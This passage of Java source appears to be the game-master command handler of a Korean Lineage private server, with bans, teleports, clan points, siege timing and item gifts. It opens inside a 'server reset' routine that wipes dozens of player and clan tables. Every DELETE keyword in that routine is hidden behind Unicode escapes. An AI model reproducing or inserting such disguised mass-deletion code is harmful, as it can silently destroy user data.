				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(3000);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				KdaLoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}

	private void LargeAreaIPBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			String banIp = "";

			L1PcInstance player = CWorld.getInstance().getPlayer(charName);

			if (player != null) {
				banIp = player.getNetConnection().getIp();

				String[] banIpArr = banIp.split("\\.");

				IpTable iptable = IpTable.getInstance();
				pc.sendPackets("----------------------------------------------------");
				Account.ban(player.getAccountName(), SC_LoginResult.BANNED_REASON_NOMANNER); // 계정을
																							// BAN시킨다.
				GameServer.disconnectChar(player);
				for (int i = 1; i <= 255; i++) {
					iptable.banIp(banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + "." + i);
				}

				pc.sendPackets("IP: " + banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + ".1~255 광역 차단.");
				pc.sendPackets("----------------------------------------------------");
			}
		} catch (Exception e) {
			pc.sendPackets(".광역밴  [범위]");
		}
	}


	private void 강제리스(L1PcInstance pc, String cmd) {
		
		try {
			StringTokenizer tok = new StringTokenizer(cmd);
			String name = tok.nextToken();
			if (name == null || name.equals(""))
				throw new Exception();

			L1PcInstance target = CWorld.getInstance().getPlayer(name);
			if (target == null) {
				pc.sendPackets(String.format("%s 님을 찾을 수 없습니다.", name));
				return;
			}
			
			CUserSocket clnt = target.getNetConnection();
			clnt.kick();
			CS_CharSelect.restartProcess(target);
			Account acc		= clnt.getAccount();
			SC_CharAmount.send(clnt, acc.countCharacters(), acc.getCharSlot());
			if(acc.countCharacters() > 0)
				CS_CommonClick.sendCharPacks(clnt);
		
			
		} catch (Exception e) {
			pc.sendPackets(".강제리스 [캐릭터명])");
			
		}
		
		
		
	}
//	public void execute(L1PcInstance gm, String cmdName) {
//		운영자텔레포트(gm);
//	}
//	public static void 운영자텔레포트(L1PcInstance gm) {
//		ArrayList<String> result = new ArrayList<String>();
//		gm.sendPackets(new SC_NPCTalkReturn(gm.getId(), "GMt", (String[]) result.toArray(new String[result.size()])));
//	}
//	
	

	private void serversave(L1PcInstance pc) {
		Saveserver();// 서버세이브 메소드 선언
		pc.sendPackets("서버저장이 완료되었습니다.");
	}

	/** 서버저장* */
	private void Saveserver() {
		/** 전체플레이어를 호출* */
		Collection<L1PcInstance> list = null;
		list = CWorld.getInstance().getAllPlayers();
		for (L1PcInstance player : list) {
			if (player == null)
				continue;
			try {
				/** 피씨저장해주고* */
				player.save();
				/** 인벤도 저장하고* */
				player.saveInventory();

			} catch (Exception ex) {
				/** 예외 인벤저장* */
				player.saveInventory();
				System.out.println("저장 명령어 에러(인벤만 저장함): " + ex);
			}
		}
	}

	private void GiveHouse(L1PcInstance gm, String poby) {
		   try {
			    StringTokenizer st = new StringTokenizer(poby);
			    String pobyname = st.nextToken();
			    int pobyhouseid = Integer.parseInt(st.nextToken());
			    L1PcInstance target = CWorld.getInstance().getPlayer(pobyname);
			    if (target != null) {
			     if (target.getClanid() != 0) {
			      L1Clan TargetClan = CWorld.getInstance().getClan(target.getClanid());
			      L1House pobyhouse = HouseTable.getInstance().getHouseTable(pobyhouseid);
			      if (pobyhouseid != 0 && pobyhouse == null) return;
                  final int expectedHouse = TargetClan.getHouseId();
                  try (l1j.server.server.model.inventory.L1InventoryTransaction tx =
                          l1j.server.server.model.inventory.L1InventoryTransaction.begin(gm,
                              l1j.server.server.model.world.residence.L1AuctionTransaction.ORDER_KEY)) {
                      tx.requireTables("clan_data");
                      tx.sql(con -> {
                          try (java.sql.PreparedStatement ps = con.prepareStatement(
                                  "UPDATE clan_data SET hashouse=? WHERE clan_id=? AND hashouse=?")) {
                              ps.setInt(1,pobyhouseid);ps.setInt(2,TargetClan.getClanId());ps.setInt(3,expectedHouse);
                              if(ps.executeUpdate()!=1)throw new java.sql.SQLException("GM house assignment changed");
                          }
                      });
                      tx.commit(() -> {
                          TargetClan.setHouseId(pobyhouseid);
                          SC_SystemMessage.send(gm, target.getClanname()+" 혈맹의 아지트 변경을 저장했습니다.");
                      });
                  }

			     } else {
			      SC_SystemMessage.send(gm, target.getName()+"님은 혈맹에 속해 있지 않습니다.");
			     }
			    } else {
			     SC_ServerMessage.send(gm, 73, pobyname);
			    }
			   } catch (Exception e) {
			    SC_SystemMessage.send(gm, "\\fY.아지트 <지급할혈맹원> <아지트번호>");
			   }
			  }

	private void castleWarStart(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			int minute = Integer.parseInt(tok.nextToken());
			Calendar cal = RealTimeClock.getInstance().getRealTimeCalendar();
			if (minute != 0)
				cal.add(Calendar.MINUTE, minute);

			CastleWar war = CastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.nextCalendar(cal);
			CastleWarBusiness.getInstance().updateCastle(war.getCastleId());
			SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
			gm.sendPackets(String.format(".공성시간이 %s 으로 변경 되었습니다.", formatter.format(cal.getTime())));
			gm.sendPackets(param + "분 뒤 공성이 시작합니다.");
			formatter = null;
		} catch (Exception e) {
			gm.sendPackets(".공성시작 [성이름두글자] [분]");
		}
	}

	private void castleWarExit(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			CastleWar war = CastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.close();
		} catch (Exception e) {
			gm.sendPackets(".공성종료 [성이름두글자]");
		}
	}
	
	private void 혈맹포인트(L1PcInstance gm) {
//		if (!(gm.getClanRank() == 9 || gm.getClanRank() == 10))  { 
//		gm.sendPackets(new SC_SystemMessage("군주 또는 수호기사만 조회가 가능합니다."));
//	      return;
//	}
	if (gm.getClanid() != 0) {
		SC_SystemMessage.send(gm, "\\f:현재 혈맹포인트: ["+gm.getClan().getWarPoint()+"]");
		} else {
			SC_SystemMessage.send(gm, "혈맹에 가입되어 있지 않아 조회할 수 없습니다.");
		}
}

	
	

	private void effect(L1PcInstance pc, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			int sprid = Integer.parseInt(stringtokenizer.nextToken());
			SC_SkillSound.send(pc, pc.getId(), sprid);
			SC_SkillSound.broadcast(pc, pc.getId(), sprid);
		} catch (Exception e) {
			pc.sendPackets(".이팩트 [숫자] 라고 입력해 주세요.");
		}
	}

	private int 최소값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT * FROM shop WHERE item_id = ? AND selling_price NOT IN (-1) ORDER BY selling_price ASC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int temp = 0;
					if (rs.getInt("pack_count") > 1)
						temp = rs.getInt("selling_price") / rs.getInt("pack_count");
					else {
						temp = rs.getInt("selling_price");
					}
					int i = temp;
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return 0;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return 0;
	}

	private int 최대값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT purchasing_price FROM shop WHERE item_id = ? ORDER BY purchasing_price DESC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int i = rs.getInt("purchasing_price");
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return -1;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}


	private void 상점검사(L1PcInstance gm) {
		try {
			ArrayList<Integer> itemids = new ArrayList<Integer>();
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			int cnt;
			Iterator i$;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT item_id FROM shop");
				rs = pstm.executeQuery();
				while (rs.next()) {
					if (!itemids.contains(Integer.valueOf(rs.getInt("item_id")))) {
						itemids.add(Integer.valueOf(rs.getInt("item_id")));
					}
				}
				cnt = 0;
				for (i$ = itemids.iterator(); i$.hasNext();) {
					int itemid = ((Integer) i$.next()).intValue();
					int 구매최저가 = 최소값(itemid);
					int 판매최고가 = 최대값(itemid);
					if ((구매최저가 != 0) && (구매최저가 < 판매최고가)) {
						SC_ChatPacket.sendDirect(gm, gm, "검출됨! [템 " + itemid + " : [구매값 " + 구매최저가 + "] [매입값 " + 판매최고가 + "]");
					}
					cnt++;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private String parseStat(String s) throws Exception {
		if (s.equalsIgnoreCase("힘"))
			return "str";
		else if (s.equalsIgnoreCase("덱스"))
			return "dex";
		else if (s.equalsIgnoreCase("콘"))
			return "con";
		else if (s.equalsIgnoreCase("인트"))
			return "int";
		else if (s.equalsIgnoreCase("위즈"))
			return "wis";
		else if (s.equalsIgnoreCase("카리"))
			return "cha";
		throw new Exception(s);
	}

	public void fullstat(L1PcInstance pc, String param) {
		try {
			String[] arr = param.split(" ");
			if (arr == null || arr.length < 2)
				throw new Exception();

			String s = parseStat(arr[0]);
			FullStater.running(pc, s, Integer.parseInt(arr[1]));
		} catch (Exception e) {
			SC_SystemMessage.send(pc, String.format(".스텟 [힘/덱스/콘/인트/위즈/카리] [올릴수] 남은스텟 %d", (pc.getLevel() - 50 - pc.getBonusStats())));
		}
	}


	private void standBy(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.STANDBY_SERVER) {
					gm.sendPackets("이미 대기 상태로 돌입하였습니다.");
					return;
				}
				Config.STANDBY_SERVER = true;
				SC_ChatPacket.broadcastOpcode("서버가 오픈대기에 돌입합니다. 일부 기능이 차단되었습니다", Opcodes.S_MESSAGE);
			} else if (status.equalsIgnoreCase("끔")) {
				if (!Config.STANDBY_SERVER) {
					gm.sendPackets("대기 상태가 아닙니다.");
					return;
				}

				CWorldWork.execute(new Runnable() {
					@Override
					public void run() {
						// Config.load();
						Config.STANDBY_SERVER = false;


						CWorld.getInstance().broadcastServerMessage("\\aH정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");

						SC_PacketBox.broadcastGreen("정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");
					//	grn.clear();
					}
				});
			}
		} catch (Exception eee) {
			gm.sendPackets(".오픈대기 [켬/끔] 으로 입력하세요.");
			gm.sendPackets("켬 - 오픈대기 상태로 전환 | 끔 - 일반모드로 게임시작");
		}
	}


	private void hold(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				holdnow(gm, target);
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".감옥 캐릭명 으로 입력해주세요.");
		}
	}

	private void holdnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleport(target, 32736, 32799, (short) 34, 5, true);
			// L1Teleport.teleport(target, 32835, 32782, (short) 701, 5, true);
			target.start_teleport(32736, 32799, 34, target.getHeading(), 169, false, true);
			//target.start_teleport(32835, 32782, 701, target.getHeading(), 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님 감옥으로 이동됨.").toString());
			target.sendPackets("감옥에 감금 되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void nocall(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null; // q
			target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) { // 타겟
				// L1Teleport.teleport(target, 33437, 32812, (short) 4, 5,
				// true);
				target.start_teleport(33437, 32812, 4, target.getHeading(), 169, true, true);
			} else {
				gm.sendPackets("접속중이지 않는 유저 ID 입니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".가라 (보낼케릭터명) 으로 입력해 주세요.");
		}
	}

	

	
	
	private void 아아(L1PcInstance gm, String param) {
		
		
		int SearchCount = 0;
		
		
		StringTokenizer st = new StringTokenizer(param);
		String char_name = st.nextToken();
		L1PcInstance target = CWorld.getInstance().getPlayer(char_name);
		try {
		if (target != null) {
			for (L1ItemInstance item : target.getInventory().getItems()) {
			
			
		if (item.get_item_level() > 0) {
			
		
		
		gm.sendPackets("\\f:"+item.getName()+" "+itemlevel(item));
		SearchCount++;
	
		
		
		}
		}
		
		gm.sendPackets("\\f:------------------------------------");
		gm.sendPackets("\\f:* 캐릭명: ["+target.getName()+"]  -  [ "+SearchCount +" ]개의 잠재력인형 보유");
		} else {
			gm.sendPackets("올바른 캐릭명을 입력해주세요.");
		}
		} catch (Exception e) {
			
		}
		
	}
	private void unprison(L1PcInstance pc, String param) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(param);
			if (target != null) {
				unprisonnow(pc, target);
			} else {
				pc.sendPackets(".마을 캐릭명");
				pc.sendPackets("그런 이름의 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			pc.sendPackets(".마을 캐릭명");
		}
	}

	private void unprisonnow(L1PcInstance gm, L1PcInstance target) {
		try {
			int i = 33437;
			int j = 32803;
			short k = 4;
			// L1Teleport.teleport(target, i, j, k, 5, false);
			target.start_teleport(i, j, k, 5, 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님을 마을로 이동.").toString());
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void autoAllPresent(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int cycles = Integer.parseInt(st.nextToken());
			long delay = Math.multiplyExact(Long.parseLong(st.nextToken()), 1000L);
			L1Item template = builderFindItem(st.nextToken());
			int enchant = Integer.parseInt(st.nextToken()), count = Integer.parseInt(st.nextToken());
			builderValidateGrant(template, count, enchant, 0, 0);
			if (cycles <= 0 || cycles > 1000 || delay < 1000L || delay > 86400000L) throw new IllegalArgumentException();
			CUserSocket socket = gm.getNetConnection();
			int stamp = gm.getSessionStamp();
			if (!builderLive(gm, socket, stamp)) throw new IllegalStateException();
			new Runnable() {
				private int remaining = cycles;
				@Override public void run() {
					if (!builderFullAccess(gm) || !builderLive(gm, socket, stamp)) return;
					builderGiftOnline(gm, template, count, enchant);
					if (--remaining > 0) CWorldWork.scheduleRequired(this, delay);
				}
			}.run();
		} catch (RuntimeException e) { SC_SystemMessage.send(gm, ".오토선물 [횟수] [초] [아이템ID] [강화] [수량]"); }
	}
	public void 캐릭압류1(L1PcInstance gm, String name) {
		setCharBlock(gm, name);
	}
	private void chatx(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null;
			target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				target.killSkillEffectTimer(L1SkillId.STATUS_CHAT_PROHIBITED);
				SC_SkillIconGFX.send(target, 36, 0);
				SC_ServerMessage.send(target, 288);
				gm.sendPackets("해당캐릭의 채금을 해제 했습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".채금해제 캐릭터명 이라고 입력해 주세요.");
		}
	}

	private void tell(L1PcInstance gm) {
		try {
			gm.start_teleport(gm.getX(), gm.getY(), gm.getMapId(), gm.getHeading(), 169, false, false);
		} catch (Exception e) {
		}
	}

	public void levelup2(L1PcInstance gm, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String user = tok.nextToken();
			L1PcInstance target = CWorld.getInstance().getPlayer(user);
			int level = Integer.parseInt(tok.nextToken());
			if (level == target.getLevel()) {
				return;
			}
			if (!IntRange.includes(level, 1, 99)) {
				gm.sendPackets("1-99의 범위에서 지정해 주세요");
				return;
			}
			target.setExp(ExpTable.getExpByLevel(level));
			gm.sendPackets(target.getName() + "님의 레벨이 변경됨! .검 [캐릭명]으로 확인요망");
		} catch (Exception e) {
			gm.sendPackets(".렙작 [캐릭명] [레벨] 입력");
		}
	}



	
	private void 혈맹포인트조회(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String char_name = st.nextToken();
			L1PcInstance target = CWorld.getInstance().getPlayer(char_name);
			
				
			if (target != null) {
				if (target.getClanid() != 0) {
					gm.sendPackets("\\f:"+target.getName() + "님의 혈맹이름 : "+target.getClanname());
					gm.sendPackets("\\f:현재 혈맹포인트: "+target.getClan().getWarPoint());
				
				} else {
					gm.sendPackets(target.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else {
				gm.sendPackets("존재하지 않는 유저 입니다.");
		}
	
		
			
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트조회 캐릭명");
		}
	}

	private void 혈맹포인트선물(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = CWorld.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("지급 포인트는 양수여야 합니다."); return; }
				final CUserSocket gmSession = gm.getNetConnection();
				final CUserSocket memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "]을 지급하였습니다."
							: "혈맹포인트 지급이 확정되지 않았습니다. DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 지급하였습니다"));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트선물 캐릭명 포인트갯수");
		}
	}
	private void 혈맹포인트삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = CWorld.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("차감 포인트는 양수여야 합니다."); return; }
				final CUserSocket gmSession = gm.getNetConnection();
				final CUserSocket memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), -id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "] 감소시켰습니다."
							: "혈맹포인트 차감이 확정되지 않았습니다. 잔액 및 DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 감소시켰습니다."));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트삭제 캐릭명 포인트갯수");
		}
	}
	
	private void allrecall(L1PcInstance gm) {
		try {
			for (L1PcInstance pc : CWorld.getInstance().getAllPlayers()) {
				if (!pc.isGm() && !pc.isPrivateShop()) {
					recallnow(gm, pc);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".전체소환 커맨드 에러");
		}
	}


	private void recallnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleportToTargetFront(target, gm, 2 , 0);
			L1Teleport.getInstance().teleportToTargetFront(target, gm, 2, true);
			 target.sendPackets("게임 마스터에게 소환되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void ShopKick(L1PcInstance gm, String param) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(param);
			if (target != null) {
				if (GameServer.tryDisconnectChar(target)) {
					gm.sendPackets(target.getName() + "님 추방을 접수했습니다.");
				} else {
					gm.sendPackets("상점 또는 접속 상태가 변경되었거나 거래 처리 중입니다. 잠시 후 다시 시도해 주세요.");
				}
			} else {
				gm.sendPackets("그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".상점추방 캐릭명");
		}
	}

	private void chainfo(L1PcInstance gm, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			String s = stringtokenizer.nextToken();
			SC_Chainfo.send(gm, 1, s);
		} catch (Exception exception21) {
			SC_SystemMessage.send(gm, ".케릭검사 캐릭터명");
		}
	}
	private void 잠재력활성화(L1PcInstance gm, String param) {
		int count = 0;
		int ccount = 0;
		
		
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.잠재력활성화 == true) {
					SC_SystemMessage.send(gm, "이미 잠재력활성화 상태입니다.");
					return;
				}
				for (Object obj : CWorld.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = true;
				
				SC_SystemMessage.send(gm, "잠재력이 활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 표기됩니다.");
			} else if (status.equalsIgnoreCase("끔")) {
				if (Config.잠재력활성화 == false) {
					SC_SystemMessage.send(gm, "이미 잠재력은 비활성화상태입니다.");
					return;
				}
				for (Object obj : CWorld.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
